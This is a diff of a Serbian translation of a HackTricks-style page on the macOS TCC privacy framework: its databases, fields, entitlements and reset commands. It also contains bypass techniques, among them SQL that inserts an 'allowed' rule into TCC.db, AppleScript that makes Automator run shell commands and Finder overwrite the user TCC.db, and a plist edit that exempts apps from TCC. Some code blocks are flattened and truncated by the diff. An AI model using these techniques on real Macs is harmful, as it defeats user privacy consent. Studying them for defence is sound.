@@ -27,11 +27,13 @@ Korisnici se susreću sa TCC-om kada aplikacije zatraže pristup zaštićenim fu
 Postoji **tccd u režimu korisnika** koji se pokreće po prijavljivanju korisnika, definisan u `/System/Library/LaunchAgents/com.apple.tccd.plist` registrovanjem mach servisa `com.apple.tccd` i `com.apple.usernotifications.delegate.com.apple.tccd`.
 
 Ovde možete videti tccd koji se izvršava kao sistem i kao korisnik:
+
 ```bash
 ps -ef | grep tcc
 0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
 501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
 ```
+
 Dozvole se **nasleđuju od roditeljske** aplikacije i **dozvole** se **prate** na osnovu **Bundle ID**-a i **Developer ID**-a.
 
 ### TCC Baze podataka
@@ -135,6 +137,7 @@ Proverom oba baze podataka možete proveriti dozvole koje je aplikacija dozvolil
 <summary>Kako izvršiti ako je to apsolutna putanja</summary>
 
 Samo uradite **`launctl load you_bin.plist`**, sa plistom kao što je:
+
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -171,11 +174,13 @@ Samo uradite **`launctl load you_bin.plist`**, sa plistom kao što je:
 </dict>
 </plist>
 ```
+
 </details>
 
 * **`auth_value`** može imati različite vrednosti: denied(0), unknown(1), allowed(2), ili limited(3).
 * **`auth_reason`** može imati sledeće vrednosti: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
 * Polje **csreq** služi da naznači kako proveriti binarnu datoteku za izvršavanje i dodeliti TCC dozvole:
+
 ```bash
 # Query to get cserq in printable hex
 select service, client, hex(csreq) from access where auth_value=2;
@@ -191,6 +196,7 @@ echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
 REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
 echo "X'$REQ_HEX'"
 ```
+
 * Za više informacija o **ostalim poljima** tabele [**proverite ovaj blog post**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).
 
 Takođe možete proveriti **već dodeljene dozvole** aplikacijama u `System Preferences --> Security & Privacy --> Privacy --> Files and Folders`.
@@ -200,6 +206,7 @@ Korisnici _mogu_ **brisati ili upitati pravila** koristeći **`tccutil`**.
 {% endhint %}
 
 #### Resetovanje TCC dozvola
+
 ```bash
 # You can reset all the permissions given to an application with
 tccutil reset All app.some.id
@@ -207,6 +214,7 @@ tccutil reset All app.some.id
 # Reset the permissions granted to all apps
 tccutil reset All
 ```
+
 ### Provere potpisa TCC
 
 TCC **baza podataka** čuva **Bundle ID** aplikacije, ali takođe **čuva** **informacije** o **potpisu** kako bi **proverila** da li aplikacija koja traži dozvolu za korišćenje određene funkcije je tačno ona koja tvrdi da jeste.
@@ -237,6 +245,7 @@ Na primer, **Telegram** ima ovlašćenje `com.apple.security.device.camera` da z
 Međutim, da bi aplikacije **pristupile** određenim korisničkim fasciklama, kao što su `~/Desktop`, `~/Downloads` i `~/Documents`, **ne moraju** imati određena **ovlašćenja.** Sistem će transparentno upravljati pristupom i **pitati korisnika** po potrebi.
 
 Apple-ove aplikacije **neće generisati prozore sa upitima**. One sadrže **unapred odobrena prava** na svojoj listi **ovlašćenja**, što znači da **nikada neće generisati iskačući prozor**, **niti** će se pojaviti u bilo kojoj od **TCC baza podataka.** Na primer:
+
 ```bash
 codesign -dv --entitlements :- /System/Applications/Calendar.app
 [...]
@@ -247,6 +256,7 @@ codesign -dv --entitlements :- /System/Applications/Calendar.app
 <string>kTCCServiceAddressBook</string>
 </array>
 ```
+
 Ovo će sprečiti Kalendar da traži od korisnika pristup podsetnicima, kalendaru i adresaru.
 
 {% hint style="success" %}
@@ -264,6 +274,7 @@ Neke TCC dozvole su: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePho
 ### Korisnička namera / com.apple.macl
 
 Kao što je ranije pomenuto, moguće je **dodeliti pristup aplikaciji fajlu prevlačenjem i ispuštanjem**. Ovaj pristup neće biti naveden u bilo kojoj TCC bazi podataka već kao **prošireni** **atribut fajla**. Ovaj atribut će **čuvati UUID** odobrene aplikacije:
+
 ```bash
 xattr Desktop/private.txt
 com.apple.macl
@@ -278,6 +289,7 @@ Filename,Header,App UUID
 otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
 uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
 ```
+
 {% hint style="info" %}
 Zanimljivo je da se atribut **`com.apple.macl`** upravlja preko **Sandbox-a**, a ne preko tccd.
 
@@ -295,45 +307,9 @@ Ako u nekom trenutku uspete da dobijete pristup pisanju preko TCC baze podataka,
 <details>
 
 <summary>Primer ubacivanja u TCC</summary>
-```sql
-INSERT INTO access (
-service,
-client,
-client_type,
-auth_value,
-auth_reason,
-auth_version,
-csreq,
-policy_id,
-indirect_object_identifier_type,
-indirect_object_identifier,
-indirect_object_code_identity,
-flags,
-last_modified,
-pid,
-pid_version,
-boot_uuid,
-last_reminded
-) VALUES (
-'kTCCServiceSystemPolicyDesktopFolder', -- service
-'com.googlecode.iterm2', -- client
-0, -- client_type (0 - bundle id)
-2, -- auth_value  (2 - allowed)
-3, -- auth_reason (3 - "User Set")
-1, -- auth_version (always 1)
-X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
-NULL, -- policy_id
-NULL, -- indirect_object_identifier_type
-'UNUSED', -- indirect_object_identifier - default value
-NULL, -- indirect_object_code_identity
-0, -- flags
-strftime('%s', 'now'), -- last_modified with default current timestamp
-NULL, -- assuming pid is an integer and optional
-NULL, -- assuming pid_version is an integer and optional
-'UNUSED', -- default value for boot_uuid
-strftime('%s', 'now') -- last_reminded with default current timestamp
-);
-```
+
+\`\`\`sql INSERT INTO access ( service, client, client\_type, auth\_value, auth\_reason, auth\_version, csreq, policy\_id, indirect\_object\_identifier\_type, indirect\_object\_identifier, indirect\_object\_code\_identity, flags, last\_modified, pid, pid\_version, boot\_uuid, last\_reminded ) VALUES ( 'kTCCServiceSystemPolicyDesktopFolder', -- service 'com.googlecode.iterm2', -- client 0, -- client\_type (0 - bundle id) 2, -- auth\_value (2 - allowed) 3, -- auth\_reason (3 - "User Set") 1, -- auth\_version (always 1) X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now NULL, -- policy\_id NULL, -- indirect\_object\_identifier\_type 'UNUSED', -- indirect\_object\_identifier - default value NULL, -- indirect\_object\_code\_identity 0, -- flags strftime('%s', 'now'), -- last\_modified with default current timestamp NULL, -- assuming pid is an integer and optional NULL, -- assuming pid\_version is an integer and optional 'UNUSED', -- default value for boot\_uuid strftime('%s', 'now') -- last\_reminded with default current timestamp ); \`\`\`
+
 </details>
 
 ### TCC Payloads
@@ -399,25 +375,14 @@ Imajte na umu da zato što aplikacija **Automator** ima TCC ovlašćenje **`kTCC
 <details>
 
 <summary>Get a shell inside Automator</summary>
-```applescript
-osascript<<EOD
-set theScript to "touch /tmp/something"
 
-tell application "Automator"
-set actionID to Automator action id "com.apple.RunShellScript"
-tell (make new workflow)
-add actionID to it
-tell last Automator action
-set value of setting "inputMethod" to 1
-set value of setting "COMMAND_STRING" to theScript
-end tell
-execute it
-end tell
-activate
-end tell
-EOD
-# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
-```
+\`\`\`applescript osascript<
+
+tell application "Automator" set actionID to Automator action id "com.apple.RunShellScript" tell (make new workflow) add actionID to it tell last Automator action set value of setting "inputMethod" to 1 set value of setting "COMMAND\_STRING" to theScript end tell execute it end tell activate end tell EOD
+
+## Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
+
+````
 </details>
 
 Isto važi i za **Script Editor aplikaciju,** ona može kontrolisati Finder, ali korišćenjem AppleScript-a ne možete je naterati da izvrši skriptu.
@@ -465,12 +430,14 @@ EOD
 # File operations in the folder should trigger the Folder Action
 touch "$HOME/Desktop/file"
 rm "$HOME/Desktop/file"
-```
-### Automatizacija (SE) + Pristupačnost (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** do FDA\*
+````
+
+#### Automatizacija (SE) + Pristupačnost (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** do FDA\*
 
 Automatizacija na **`System Events`** + Pristupačnost (**`kTCCServicePostEvent`**) omogućava slanje **tastera na procese**. Na ovaj način možete zloupotrebiti Finder da promenite korisnički TCC.db ili da date FDA proizvoljnoj aplikaciji (mada će možda biti potrebna lozinka za ovo).
 
 Primer prebrisavanja korisničkog TCC.db preko Findera:
+
 ```applescript
 -- store the TCC.db file to copy in /tmp
 osascript <<EOF
@@ -516,31 +483,32 @@ keystroke "v" using {command down}
 end tell
 EOF
 ```
-### `kTCCServiceAccessibility` ka FDA\*
+
+#### `kTCCServiceAccessibility` ka FDA\*
 
 Proverite ovu stranicu za neke [**payload-ove za zloupotrebu dozvola za pristupačnost**](macos-tcc-payloads.md#accessibility) kako biste postigli privilegije eskalacije do FDA\* ili na primer pokrenuli keylogger.
 
-### Klijent za bezbednost krajnjih tačaka ka FDA
+#### Klijent za bezbednost krajnjih tačaka ka FDA
 
 Ako imate **`kTCCServiceEndpointSecurityClient`**, imate FDA. Kraj.
 
-### Sistemski pravilnik SysAdmin fajlova ka FDA
+#### Sistemski pravilnik SysAdmin fajlova ka FDA
 
 **`kTCCServiceSystemPolicySysAdminFiles`** omogućava **promenu** atributa **`NFSHomeDirectory`** korisnika što menja njegov matični folder i time omogućava **zaobilazak TCC**.
 
-### Korisnička TCC baza podataka ka FDA
+#### Korisnička TCC baza podataka ka FDA
 
 Dobijanjem **dozvola za pisanje** nad **korisničkom TCC** bazom podataka ne možete sebi dodeliti **`FDA`** dozvole, samo onaj koji se nalazi u sistemskoj bazi podataka može to da dodeli.
 
 Ali možete sebi dati **`Automatizaciju prava za Finder`**, i zloupotrebiti prethodnu tehniku za eskalaciju do FDA\*.
 
-### **FDA ka TCC dozvolama**
+#### **FDA ka TCC dozvolama**
 
 **Pristup celom disku** u TCC naziv je **`kTCCServiceSystemPolicyAllFiles`**
 
 Ne mislim da je ovo prava eskalacija privilegija, ali u slučaju da vam bude korisno: Ako kontrolišete program sa FDA možete **modifikovati korisničku TCC bazu podataka i sebi dodeliti bilo kakav pristup**. Ovo može biti korisno kao tehnika upornosti u slučaju da izgubite svoje FDA dozvole.
 
-### **SIP zaobilazak ka TCC zaobilasku**
+#### **SIP zaobilazak ka TCC zaobilasku**
 
 Sistem **TCC baza podataka** je zaštićena sa **SIP**, zbog toga samo procesi sa **naznačenim privilegijama** mogu da je modifikuju. Dakle, ako napadač pronađe **SIP zaobilazak** nad **fajlom** (može da modifikuje fajl ograničen SIP-om), biće u mogućnosti da:
 
@@ -551,11 +519,14 @@ Sistem **TCC baza podataka** je zaštićena sa **SIP**, zbog toga samo procesi s
 
 Međutim, postoji još jedna opcija za zloupotrebu ovog **SIP zaobilaska za zaobilaženje TCC**, fajl `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` je lista aplikacija koje zahtevaju TCC izuzetak. Dakle, ako napadač može **ukloniti SIP zaštitu** sa ovog fajla i dodati svoju **sopstvenu aplikaciju**, aplikacija će moći da zaobiđe TCC.\
 Na primer, da dodate terminal:
+
 ```bash
 # Get needed info
 codesign -d -r- /System/Applications/Utilities/Terminal.app
 ```
+
 AllowApplicationsList.plist:
+
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -578,29 +549,14 @@ AllowApplicationsList.plist:
 </dict>
 </plist>
 ```
-### TCC Bypassovi
 
-{% content-ref url="macos-tcc-bypasses/" %}
-[macos-tcc-bypasses](macos-tcc-bypasses/)
-{% endcontent-ref %}
+#### TCC Bypassovi
 
-## Reference
+### Reference
 
 * [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
 * [**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
 * [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
 * [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
-
-<details>
-
-<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
-
-Drugi načini podrške HackTricks-u:
-
-* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
-* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
